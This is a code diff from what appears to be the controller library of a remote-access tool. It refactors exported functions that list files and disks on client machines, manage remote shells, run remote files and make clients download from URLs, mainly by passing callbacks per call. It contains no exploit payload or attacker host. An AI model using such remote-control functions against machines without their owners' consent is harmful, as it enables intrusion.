@@ -133,7 +133,7 @@ static DWORD WINAPI ListFileThread(LPVOID lpParameter)
 
 		int nMsg = pParam->pFo == &g_rfo ? MODULE_MSG_LISTREMOTEFILE : MODULE_MSG_LISTLOCALFILE;
 
-		ClientInfoManager::GetInstanceRef().QueryModuleInfo(pParam->clientid.c_str(),nMsg,(LPVOID)retjson.c_str(),pParam->lpParameter1);
+		pParam->fnProc(pParam->clientid.c_str(),nMsg,(LPVOID)retjson.c_str(),pParam->lpParameter1);
 	}
 
 	delete pParam;
@@ -198,7 +198,7 @@ static DWORD WINAPI ListDiskThread(LPVOID lpParameter)
 
 		int nMsg = pParam->pFO == &g_rfo ? MODULE_MSG_LISTREMOTEFILE : MODULE_MSG_LISTLOCALFILE;
 
-		ClientInfoManager::GetInstanceRef().QueryModuleInfo(pParam->clientid.c_str(),nMsg,(LPVOID)retjson.c_str(),pParam->lpParameter1);
+		pParam->fnProc(pParam->clientid.c_str(),nMsg,(LPVOID)retjson.c_str(),pParam->lpParameter1);
 	}
 
 	delete pParam;
@@ -301,7 +301,7 @@ MASTER2_API void CloseShell(LPCTSTR clientid)
 	ShellManager::GetInstanceRef().CloseShell(clientid);
 }
 
-MASTER2_API void AsynListFiles( LPCTSTR clientid, LPCTSTR findstr,BOOL isClient, LPVOID lpParameter )
+MASTER2_API void AsynListFiles( LPCTSTR clientid, LPCTSTR findstr,BOOL isClient, FnModuleNotifyProc callback ,LPVOID lpParameter )
 {
 	LIST_FILE_PARAMETER* pData = new LIST_FILE_PARAMETER;
 
@@ -309,19 +309,20 @@ MASTER2_API void AsynListFiles( LPCTSTR clientid, LPCTSTR findstr,BOOL isClient,
 	pData->clientid = clientid;
 	pData->findstr = findstr;
 	pData->lpParameter1 = lpParameter;
+	pData->fnProc = callback;
 
 	DWORD dwThreadId;
 	CreateThread(NULL,0,ListFileThread, pData,0, &dwThreadId);
 }
-MASTER2_API void AsynListDisks( LPCWSTR clientid,BOOL isClient, LPVOID lpParameter )
+MASTER2_API void AsynListDisks( LPCWSTR clientid,BOOL isClient, FnModuleNotifyProc callback , LPVOID lpParameter )
 {
 	LIST_DISK_PARAMETER* pData = new LIST_DISK_PARAMETER;
 	pData->lpParameter1 = lpParameter;
+	pData->fnProc = callback;
 
 	pData->pFO = isClient ? (IRCFileOperation*)&g_rfo : (IRCFileOperation*)&g_lfo;
 
 	pData->clientid = clientid;
-	pData->lpParameter1 = lpParameter;
 
 	DWORD dwThreadId;
 	CreateThread(NULL,0,ListDiskThread, pData,0, &dwThreadId);
@@ -487,27 +488,6 @@ MASTER2_API BOOL QuerySendingMessageStatus( LPCTSTR clientid, MSGSERIALID sendMs
 	return CommManager::GetInstanceRef().QuerySendStatus(clientid, sendMsgserialid, *pdwSentBytes, *pdwTotalBytes);
 }
 
-
-MASTER2_API void QueryModuleInstallStatus( LPCTSTR clientid, LPCTSTR moduleName, MODULE_INST_STATUS* pStatus, UINT* pProgress )
-{
-	if (NULL == pStatus || NULL == pProgress) return;
-
-	MSGSERIALID serial;
-	ClientInfoManager::GetInstanceRef().QueryModuleStatus(clientid, moduleName, *pStatus, &serial);
-
-	if (*pStatus == MODULESTATUS_INSTALLING)
-	{
-		*pProgress = 0;
-
-		DWORD dwSentBytes = 0;
-		DWORD dwTotalBytes = 0;
-		if (CommManager::GetInstanceRef().QuerySendStatus(clientid, serial, dwSentBytes, dwTotalBytes))
-		{
-			*pProgress = dwSentBytes * 100 / dwTotalBytes;
-		}
-	}
-}
-
 MASTER2_API BOOL ModifyPacketStatus(ULONG serial,LPCTSTR clientid,BOOL status)
 {
 	return CommManager::GetInstanceRef().ModifyPacketStatus(serial,clientid,status);
@@ -601,11 +581,6 @@ MASTER2_API void RunRemoteFile(LPCTSTR clientid,LPCTSTR clientpath)
 }
 
 /***********************Ä£¿é¹¦ÄÜAPI***********************************/
-MASTER2_API void SetModuleCallBack(FnModuleNotifyProc func)
-{
-	ClientInfoManager::GetInstanceRef().SetModuleCallBack(func);
-}
-
 MASTER2_API void HttpDownLoad(LPCTSTR clientid,LPCTSTR url,LPCTSTR path)
 {
 	return CHttpDown::GetInstanceRef().Down(clientid,url,path);
